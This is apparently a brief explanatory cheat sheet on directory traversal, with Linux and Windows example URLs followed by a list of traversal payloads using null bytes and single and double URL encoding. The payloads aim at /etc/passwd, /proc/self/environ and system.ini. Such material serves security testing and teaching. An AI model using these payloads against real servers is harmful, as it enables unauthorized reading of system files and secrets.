1. Linux Directory Traversal Example:
In Linux, the path separator is "/", and directory traversal can be accomplished by manipulating the file path. Let's assume we have a vulnerable web application that serves files based on user input:

Example URL: `http://example.com/files/view?file=../../etc/passwd`

In this case, by including `"../../etc/passwd"` as the value for the `file` parameter, an attacker can traverse directories and access the `/etc/passwd` file, which contains user account information.

2. Windows Directory Traversal Example:
In Windows, the path separator is "\", and directory traversal can be achieved by exploiting the file path in a similar manner. Let's consider a vulnerable web application running on a Windows server:

Example URL: `http://example.com/files/view?file=..\..\Windows\system.ini`

By including `"..\..\Windows\system.ini"` as the value for the `file` parameter, an attacker can traverse directories and access the `system.ini` file, which contains system configuration information.

    Basic Path Traversal:
        ../../../../etc/passwd
        ../../../etc/hosts
        ../../../proc/self/environ

    Null Byte Injection:
        ../../../../etc/passwd%00
        ../../../etc/hosts%00
        ../../../proc/self/environ%00

    URL Encoding:
        %2e%2e%2fetc%2fpasswd
        %2e%2e%2fetc%2fhosts
        %2e%2e%2fproc%2fself%2fenviron

    Double URL Encoding:
        %252e%252e%252fetc%252fpasswd
        %252e%252e%252fetc%252fhosts
        %252e%252e%252fproc%252fself%252fenviron

    Operating System-specific Techniques:
        ..\..\..\Windows\system.ini (for Windows systems)
        ../../../../../../../../../../../etc/passwd (for Unix-like systems)
